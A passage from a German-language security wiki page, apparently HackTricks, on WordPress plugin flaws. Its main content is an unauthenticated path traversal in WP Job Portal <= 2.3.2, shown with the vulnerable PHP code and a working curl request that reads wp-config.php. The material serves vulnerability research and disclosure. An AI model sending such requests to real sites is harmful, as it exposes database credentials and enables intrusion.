Die Antwort gibt das Ergebnis der injizierten Abfrage preis oder ändert die Datenbank, was SQLi beweist.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Eine andere Aufgabe, **downloadcustomfile**, erlaubte es Besuchern, **jede Datei auf der Festplatte** über Path Traversal herunterzuladen. Der verwundbare Sink befindet sich in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ist vom Angreifer kontrolliert und wird **ohne Sanitisation** verkettet. Wiederum ist die einzige Barriere ein **CSRF-Nonce**, der von der Lebenslaufseite abgerufen werden kann.

#### Ausnutzung
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Der Server antwortet mit den Inhalten von `wp-config.php`, wodurch DB-Anmeldeinformationen und Authentifizierungsschlüssel offengelegt werden.

## Referenzen

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
